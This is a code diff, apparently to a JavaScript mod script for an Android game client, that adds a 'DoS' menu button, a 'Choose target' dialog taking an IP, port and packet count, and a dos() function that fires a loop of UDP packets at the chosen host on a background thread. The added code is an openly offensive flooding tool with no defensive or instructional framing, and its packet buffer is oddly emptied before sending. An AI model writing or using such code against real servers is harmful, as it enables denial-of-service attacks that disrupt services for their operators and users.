@@ -1045,7 +1045,16 @@ function mainMenu() {
 					}
 				});
 				menuLayout.addView(wbtest);
-
+				var idfk = new styleButton();
+				idfk.setText("DoS");
+				idfk.setTextColor(GUIText);
+				idfk.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (v) {
+					menu.dismiss();
+					sodEditor();
+					}
+				});
+				menuLayout.addView(idfk);
 				menu = new android.widget.PopupWindow(menuLayout1, MainActivity.getWindowManager()
 					.getDefaultDisplay()
 					.getWidth() / GUISize, MainActivity.getWindowManager()
@@ -1067,6 +1076,71 @@ function mainMenu() {
 			}
 		}
 	}));
+}
+
+function dos(ip, port, howmuch){
+var r = new java.lang.Runnable({
+       run: function() {
+	try{
+for(var i = 0;i<=howmuch;i++){
+var socket = new java.net.DatagramSocket();
+var buf = new byte[2024];
+buf = "".toString().getBytes("UTF8");
+socket.send(new java.net.DatagramPacket(buf, buf.length, java.net.InetAddress.getByName(ip), port));
+socket.close();
+}
+        }catch(e){
+            print(e);
+        }}});
+var t = new java.lang.Thread(r);
+t.start();
+}
+
+function sodEditor() {
+	ctx.runOnUiThread(new java.lang.Runnable() {
+		run: function () {
+			try {
+				sodD = new android.widget.PopupWindow();
+				var Layer = new android.widget.LinearLayout(ctx);
+				showMenuBtn();
+				var ip = new styleInput();
+				var port = new styleInput();
+				var packet = new styleInput();
+				var Dialog = new android.app.Dialog(ctx);
+				var Exit = new styleButton(ctx);
+				Dialog.setTitle("Choose target");
+				Dialog.setContentView(Layer);
+				Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
+				Dialog.show();
+				Layer.addView(ip);
+				Layer.addView(port);
+				Layer.addView(packet);
+				Layer.addView(Exit);
+				ip.setText("");
+				ip.setHint("0.0.0.0");
+				port.setText("");
+				port.setHint("0");
+				packet.setText("");
+				packet.setHint("0");
+				Exit.setText("Fire");
+				Exit.setOnClickListener(new android.view.View.OnClickListener() {
+					onClick: function (view) {
+						f3b13 = ip.getText();
+						n2a19 = port.getText();
+						zp90Q = packet.getText();
+						dos(f3b13, n2a19, zp90Q);
+						Dialog.dismiss();
+					}
+				});
+				sodD.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+				sodD.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
+				sodD.showAtLocation(ctx.getWindow()
+					.getDecorView(), android.view.Gravity.TOP, 0, 0);
+			} catch (e) {
+				print("sod dialog:" + e);
+			}
+		}
+	});
 }
 
 function assetEditor() {
